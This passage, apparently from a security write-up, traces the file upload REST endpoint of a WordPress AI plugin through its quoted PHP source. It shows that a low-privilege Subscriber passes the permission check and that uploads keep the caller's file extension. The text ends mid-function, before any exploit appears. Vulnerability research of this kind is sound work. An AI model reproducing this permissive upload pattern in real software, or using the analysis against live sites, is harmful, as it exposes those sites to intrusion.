<li>Endpoint: <code>/wp-json/mwai/v1/simpleFileUpload</code></li>
<li>Callback: <code>rest_simpleFileUpload</code></li>
</ul>
<p>With <code>permission_callback</code> being the return value of <code>can_access_public_api()</code></p>
<div class="highlight" data-open="true" title="core.php"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">public</span> <span class="k">function</span> <span class="nf">can_access_public_api</span><span class="p">(</span> <span class="nv">$feature</span><span class="p">,</span> <span class="nv">$extra</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nv">$logged_in</span> <span class="o">=</span> <span class="nx">is_user_logged_in</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="nx">apply_filters</span><span class="p">(</span> <span class="s1">&#39;mwai_allow_public_api&#39;</span><span class="p">,</span> <span class="nv">$logged_in</span><span class="p">,</span> <span class="nv">$feature</span><span class="p">,</span> <span class="nv">$extra</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
</div>
</div><p>In the WP REST API, the function <code>is_user_logged_in()</code> will return:</p>
<ul>
<li><code>true</code>: If the user is logged in and the <strong>X-WP-Nonce</strong> header is valid</li>
<li><code>false</code>: If the user is not logged in or the <strong>X-WP-Nonce</strong> header is invalid</li>
</ul>
<p><code>can_access_public_api</code> will call the <code>mwai_allow_public_api</code> filter registered above =&gt; <code>auth_via_bearer_token($logged_in, $feature, $extra)</code> is invoked</p>
<div class="highlight" data-open="true" title="api.php"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">public</span> <span class="k">function</span> <span class="nf">auth_via_bearer_token</span><span class="p">(</span> <span class="nv">$allow</span><span class="p">,</span> <span class="nv">$feature</span><span class="p">,</span> <span class="nv">$extra</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="k">empty</span><span class="p">(</span> <span class="nv">$extra</span> <span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="k">empty</span><span class="p">(</span> <span class="nv">$extra</span><span class="o">-&gt;</span><span class="na">get_header</span><span class="p">(</span> <span class="s1">&#39;Authorization&#39;</span> <span class="p">)</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$token</span> <span class="o">=</span> <span class="nv">$extra</span><span class="o">-&gt;</span><span class="na">get_header</span><span class="p">(</span> <span class="s1">&#39;Authorization&#39;</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$token</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span> <span class="s1">&#39;Bearer &#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="nv">$token</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="nv">$token</span> <span class="o">===</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">bearer_token</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="c1">// We set the current user to the first admin.
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="nv">$admin</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">core</span><span class="o">-&gt;</span><span class="na">get_admin_user</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">      <span class="nx">wp_set_current_user</span><span class="p">(</span> <span class="nv">$admin</span><span class="o">-&gt;</span><span class="na">ID</span><span class="p">,</span> <span class="nv">$admin</span><span class="o">-&gt;</span><span class="na">user_login</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="k">return</span> <span class="k">true</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="nv">$allow</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
</div>
</div><p>The <code>auth_via_bearer_token()</code> function authenticates using a Bearer Token.
Its process:</p>
<ul>
<li>
<p>If the request has an <code>Authorization</code> header containing <code>Bearer &lt;token&gt;</code>
and the <code>&lt;token&gt;</code> value matches the token stored in the option (<code>$this-&gt;bearer_token</code>), then:</p>
<ul>
<li>Set the current user to the first admin (<code>wp_set_current_user()</code>),</li>
<li>Return <code>true</code> → allow API access.</li>
</ul>
</li>
<li>
<p>If absent or the token is incorrect → return <code>$allow</code>,
i.e., the initial result from <code>is_user_logged_in()</code>.</p>
</li>
</ul>
<div class="details admonition info open disabled">
  <div class="details-summary admonition-title"><i class="icon fa-fw fa-solid fa-circle-info" aria-hidden="true"></i>Info</div>
  <div class="details-content">
    <div class="admonition-content"><p>By default, there will be no <strong>Bearer Token</strong> for authentication, so we rely on a valid <strong>X-WP-Nonce</strong> of a Subscriber user =&gt; <code>permission_callback=true</code></p></div>
  </div>
</div><hr>
<div class="highlight" data-open="true" title="api.php"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="hl"><span class="lnt">10
</span></span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="hl"><span class="lnt">28
</span></span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">public</span> <span class="k">function</span> <span class="nf">rest_simpleFileUpload</span><span class="p">(</span> <span class="nv">$request</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="k">try</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$params</span> <span class="o">=</span> <span class="nv">$request</span><span class="o">-&gt;</span><span class="na">get_params</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$files</span> <span class="o">=</span> <span class="nv">$request</span><span class="o">-&gt;</span><span class="na">get_file_params</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="c1">// Check if file is provided
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">if</span> <span class="p">(</span> <span class="k">empty</span><span class="p">(</span> <span class="nv">$files</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">]</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="c1">// Check for base64 encoded file data
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="o">...</span>
</span></span><span class="line hl"><span class="cl">      <span class="nv">$result</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">simpleFileUpload</span><span class="p">(</span> <span class="k">null</span><span class="p">,</span> <span class="nv">$base64</span><span class="p">,</span> <span class="nv">$filename</span><span class="p">,</span> <span class="nv">$purpose</span><span class="p">,</span> <span class="nv">$ttl</span><span class="p">,</span> <span class="nv">$target</span><span class="p">,</span> <span class="nv">$metadata</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="c1">// Handle regular file upload
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="nv">$file</span> <span class="o">=</span> <span class="nv">$files</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">      <span class="nv">$purpose</span> <span class="o">=</span> <span class="nx">isset</span><span class="p">(</span> <span class="nv">$params</span><span class="p">[</span><span class="s1">&#39;purpose&#39;</span><span class="p">]</span> <span class="p">)</span> <span class="o">?</span> <span class="nv">$params</span><span class="p">[</span><span class="s1">&#39;purpose&#39;</span><span class="p">]</span> <span class="o">:</span> <span class="s1">&#39;files&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="nv">$ttl</span> <span class="o">=</span> <span class="nx">isset</span><span class="p">(</span> <span class="nv">$params</span><span class="p">[</span><span class="s1">&#39;ttl&#39;</span><span class="p">]</span> <span class="p">)</span> <span class="o">?</span> <span class="nx">intval</span><span class="p">(</span> <span class="nv">$params</span><span class="p">[</span><span class="s1">&#39;ttl&#39;</span><span class="p">]</span> <span class="p">)</span> <span class="o">:</span> <span class="mi">3600</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="nv">$target</span> <span class="o">=</span> <span class="nx">isset</span><span class="p">(</span> <span class="nv">$params</span><span class="p">[</span><span class="s1">&#39;target&#39;</span><span class="p">]</span> <span class="p">)</span> <span class="o">?</span> <span class="nv">$params</span><span class="p">[</span><span class="s1">&#39;target&#39;</span><span class="p">]</span> <span class="o">:</span> <span class="k">null</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="nv">$metadata</span> <span class="o">=</span> <span class="nx">isset</span><span class="p">(</span> <span class="nv">$params</span><span class="p">[</span><span class="s1">&#39;metadata&#39;</span><span class="p">]</span> <span class="p">)</span> <span class="o">?</span> <span class="nv">$params</span><span class="p">[</span><span class="s1">&#39;metadata&#39;</span><span class="p">]</span> <span class="o">:</span> <span class="p">[];</span>
</span></span><span class="line"><span class="cl">      
</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">debug</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$debug</span> <span class="o">=</span> <span class="nx">sprintf</span><span class="p">(</span> <span class="s1">&#39;REST [SimpleFileUpload]: file upload, name=%s, purpose=%s&#39;</span><span class="p">,</span> 
</span></span><span class="line"><span class="cl">          <span class="nv">$file</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">],</span> 
</span></span><span class="line"><span class="cl">          <span class="nv">$purpose</span> 
</span></span><span class="line"><span class="cl">        <span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nx">Meow_MWAI_Logging</span><span class="o">::</span><span class="na">log</span><span class="p">(</span> <span class="nv">$debug</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">      
</span></span><span class="line hl"><span class="cl">      <span class="nv">$result</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">simpleFileUpload</span><span class="p">(</span> <span class="nv">$file</span><span class="p">,</span> <span class="k">null</span><span class="p">,</span> <span class="k">null</span><span class="p">,</span> <span class="nv">$purpose</span><span class="p">,</span> <span class="nv">$ttl</span><span class="p">,</span> <span class="nv">$target</span><span class="p">,</span> <span class="nv">$metadata</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="k">new</span> <span class="nx">WP_REST_Response</span><span class="p">(</span> <span class="p">[</span> <span class="s1">&#39;success&#39;</span> <span class="o">=&gt;</span> <span class="k">true</span><span class="p">,</span> <span class="s1">&#39;data&#39;</span> <span class="o">=&gt;</span> <span class="nv">$result</span> <span class="p">],</span> <span class="mi">200</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">catch</span> <span class="p">(</span> <span class="nx">Exception</span> <span class="nv">$e</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="k">new</span> <span class="nx">WP_REST_Response</span><span class="p">(</span> <span class="p">[</span> <span class="s1">&#39;success&#39;</span> <span class="o">=&gt;</span> <span class="k">false</span><span class="p">,</span> <span class="s1">&#39;message&#39;</span> <span class="o">=&gt;</span> <span class="nv">$e</span><span class="o">-&gt;</span><span class="na">getMessage</span><span class="p">()</span> <span class="p">],</span> <span class="mi">500</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
</div>
</div><p>The <code>rest_simpleFileUpload()</code> function handles file uploads via the REST API.</p>
<ul>
<li>Retrieves parameters and files from <code>$request</code>.</li>
<li>If no file is present, checks for base64 data and calls <code>$this-&gt;simpleFileUpload()</code>.</li>
<li>If a file is present, retrieves optional parameters (<code>purpose</code>, <code>ttl</code>, <code>target</code>, <code>metadata</code>), logs if debug is enabled, then calls <code>$this-&gt;simpleFileUpload()</code>.</li>
<li>Returns a <code>WP_REST_Response</code> with <code>success =&gt; true</code> and the file data, or <code>success =&gt; false</code> if an error occurs.</li>
</ul>
<div class="highlight" data-open="true" title="api.php"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="hl"><span class="lnt">13
</span></span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">public</span> <span class="k">function</span> <span class="nf">simpleFileUpload</span><span class="p">(</span> <span class="nv">$file</span> <span class="o">=</span> <span class="k">null</span><span class="p">,</span> <span class="nv">$base64</span> <span class="o">=</span> <span class="k">null</span><span class="p">,</span> <span class="nv">$filename</span> <span class="o">=</span> <span class="k">null</span><span class="p">,</span> <span class="nv">$purpose</span> <span class="o">=</span> <span class="s1">&#39;files&#39;</span><span class="p">,</span> <span class="nv">$ttl</span> <span class="o">=</span> <span class="mi">3600</span><span class="p">,</span> <span class="nv">$target</span> <span class="o">=</span> <span class="k">null</span><span class="p">,</span> <span class="nv">$metadata</span> <span class="o">=</span> <span class="p">[]</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="o">...</span>
</span></span><span class="line"><span class="cl">  <span class="k">try</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="k">empty</span><span class="p">(</span> <span class="nv">$base64</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">     <span class="o">...</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span> <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="k">empty</span><span class="p">(</span> <span class="nv">$file</span> <span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nx">is_array</span><span class="p">(</span> <span class="nv">$file</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="c1">// Handle regular file upload
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="k">empty</span><span class="p">(</span> <span class="nv">$file</span><span class="p">[</span><span class="s1">&#39;error&#39;</span><span class="p">]</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">throw</span> <span class="k">new</span> <span class="nx">Exception</span><span class="p">(</span> <span class="s1">&#39;File upload error: &#39;</span> <span class="o">.</span> <span class="nv">$file</span><span class="p">[</span><span class="s1">&#39;error&#39;</span><span class="p">]</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">      
</span></span><span class="line hl"><span class="cl">      <span class="nv">$refId</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">core</span><span class="o">-&gt;</span><span class="na">files</span><span class="o">-&gt;</span><span class="na">upload_file</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$file</span><span class="p">[</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">],</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$file</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">],</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$purpose</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$metadata</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="k">null</span><span class="p">,</span> <span class="c1">// envId
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nv">$target</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$ttl</span>
</span></span><span class="line"><span class="cl">      <span class="p">);</span>
</span></span><span class="line"><span class="cl">      
</span></span><span class="line"><span class="cl">      <span class="nv">$url</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">core</span><span class="o">-&gt;</span><span class="na">files</span><span class="o">-&gt;</span><span class="na">get_url</span><span class="p">(</span> <span class="nv">$refId</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">      
</span></span><span class="line"><span class="cl">      <span class="k">return</span> <span class="p">[</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;id&#39;</span> <span class="o">=&gt;</span> <span class="nv">$refId</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;url&#39;</span> <span class="o">=&gt;</span> <span class="nv">$url</span>
</span></span><span class="line"><span class="cl">      <span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="k">throw</span> <span class="k">new</span> <span class="nx">Exception</span><span class="p">(</span> <span class="s1">&#39;Either a file or base64 data must be provided.&#39;</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">catch</span> <span class="p">(</span> <span class="nx">Exception</span> <span class="nv">$e</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">throw</span> <span class="k">new</span> <span class="nx">Exception</span><span class="p">(</span> <span class="s1">&#39;File upload failed: &#39;</span> <span class="o">.</span> <span class="nv">$e</span><span class="o">-&gt;</span><span class="na">getMessage</span><span class="p">()</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
</div>
</div><p>The <code>simpleFileUpload()</code> function performs an upload from either file or base64 data.</p>
<ul>
<li>
<p>If <code>$base64</code> is not empty → handle upload from base64.</p>
</li>
<li>
<p>If <code>$file</code> is a valid array:</p>
<ul>
<li>Check upload error (<code>$file['error']</code>) → throw Exception if present.</li>
<li>Call <code>$this-&gt;core-&gt;files-&gt;upload_file()</code> to save the file.</li>
<li>Get the file URL via <code>$this-&gt;core-&gt;files-&gt;get_url($refId)</code> and return an array <code>['id' =&gt; $refId, 'url' =&gt; $url]</code>.</li>
</ul>
</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span><span class="lnt">69
</span><span class="lnt">70
</span><span class="lnt">71
</span><span class="lnt">72
</span><span class="lnt">73
</span><span class="lnt">74
</span><span class="lnt">75
</span><span class="lnt">76
</span><span class="lnt">77
</span><span class="lnt">78
</span><span class="lnt">79
</span><span class="lnt">80
</span><span class="lnt">81
</span><span class="lnt">82
</span><span class="lnt">83
</span><span class="lnt">84
</span><span class="lnt">85
</span><span class="lnt">86
</span><span class="lnt">87
</span><span class="lnt">88
</span><span class="lnt">89
</span><span class="lnt">90
</span><span class="lnt">91
</span><span class="lnt">92
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">public</span> <span class="k">function</span> <span class="nf">upload_file</span><span class="p">(</span><span class="nv">$path</span><span class="p">,</span><span class="nv">$filename</span> <span class="o">=</span> <span class="k">null</span><span class="p">,</span><span class="nv">$purpose</span> <span class="o">=</span> <span class="k">null</span><span class="p">,</span><span class="nv">$metadata</span> <span class="o">=</span> <span class="k">null</span><span class="p">,</span><span class="nv">$envId</span> <span class="o">=</span> <span class="k">null</span><span class="p">,</span><span class="nv">$target</span> <span class="o">=</span> <span class="k">null</span><span class="p">,</span><span class="nv">$expiry</span> <span class="o">=</span> <span class="k">null</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="k">require_once</span><span class="p">(</span> <span class="nx">ABSPATH</span> <span class="o">.</span> <span class="s1">&#39;wp-admin/includes/image.php&#39;</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">require_once</span><span class="p">(</span> <span class="nx">ABSPATH</span> <span class="o">.</span> <span class="s1">&#39;wp-admin/includes/file.php&#39;</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">require_once</span><span class="p">(</span> <span class="nx">ABSPATH</span> <span class="o">.</span> <span class="s1">&#39;wp-admin/includes/media.php&#39;</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="nv">$target</span> <span class="o">=</span> <span class="k">empty</span><span class="p">(</span> <span class="nv">$target</span> <span class="p">)</span> <span class="o">?</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">core</span><span class="o">-&gt;</span><span class="na">get_option</span><span class="p">(</span> <span class="s1">&#39;image_local_upload&#39;</span> <span class="p">)</span> <span class="o">:</span> <span class="nv">$target</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="nv">$expiry</span> <span class="o">=</span> <span class="k">empty</span><span class="p">(</span> <span class="nv">$expiry</span> <span class="p">)</span> <span class="o">?</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">core</span><span class="o">-&gt;</span><span class="na">get_option</span><span class="p">(</span> <span class="s1">&#39;image_expires&#39;</span> <span class="p">)</span> <span class="o">:</span> <span class="nv">$expiry</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="nv">$expires</span> <span class="o">=</span> <span class="p">(</span> <span class="nv">$expiry</span> <span class="o">===</span> <span class="s1">&#39;never&#39;</span> <span class="o">||</span> <span class="k">empty</span><span class="p">(</span> <span class="nv">$expiry</span> <span class="p">)</span> <span class="p">)</span> <span class="o">?</span> <span class="k">null</span> <span class="o">:</span> <span class="nx">date</span><span class="p">(</span> <span class="s1">&#39;Y-m-d H:i:s&#39;</span><span class="p">,</span> <span class="nx">time</span><span class="p">()</span> <span class="o">+</span> <span class="nx">intval</span><span class="p">(</span> <span class="nv">$expiry</span> <span class="p">)</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nv">$refId</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">generate_refId</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">  <span class="nv">$url</span> <span class="o">=</span> <span class="k">null</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="k">empty</span><span class="p">(</span> <span class="nv">$filename</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$parsed_url</span> <span class="o">=</span> <span class="nx">parse_url</span><span class="p">(</span> <span class="nv">$path</span><span class="p">,</span> <span class="nx">PHP_URL_PATH</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$filename</span> <span class="o">=</span> <span class="nx">basename</span><span class="p">(</span> <span class="nv">$parsed_url</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$extension</span> <span class="o">=</span> <span class="nx">pathinfo</span><span class="p">(</span> <span class="nv">$filename</span><span class="p">,</span> <span class="nx">PATHINFO_EXTENSION</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$extension</span> <span class="o">=</span> <span class="nx">pathinfo</span><span class="p">(</span> <span class="nv">$filename</span><span class="p">,</span> <span class="nx">PATHINFO_EXTENSION</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="nv">$newFilename</span> <span class="o">=</span> <span class="nv">$refId</span> <span class="o">.</span> <span class="s1">&#39;.&#39;</span> <span class="o">.</span> <span class="nv">$extension</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="nv">$unique_filename</span> <span class="o">=</span> <span class="nx">wp_unique_filename</span><span class="p">(</span> <span class="nx">wp_upload_dir</span><span class="p">()[</span><span class="s1">&#39;path&#39;</span><span class="p">],</span> <span class="nv">$newFilename</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nv">$destination</span> <span class="o">=</span> <span class="nx">wp_upload_dir</span><span class="p">()[</span><span class="s1">&#39;path&#39;</span><span class="p">]</span> <span class="o">.</span> <span class="s1">&#39;/&#39;</span> <span class="o">.</span> <span class="nv">$unique_filename</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="nv">$target</span> <span class="o">===</span> <span class="s1">&#39;uploads&#39;</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">check_db</span><span class="p">()</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="k">throw</span> <span class="k">new</span> <span class="nx">Exception</span><span class="p">(</span> <span class="s1">&#39;Could not create database table.&#39;</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
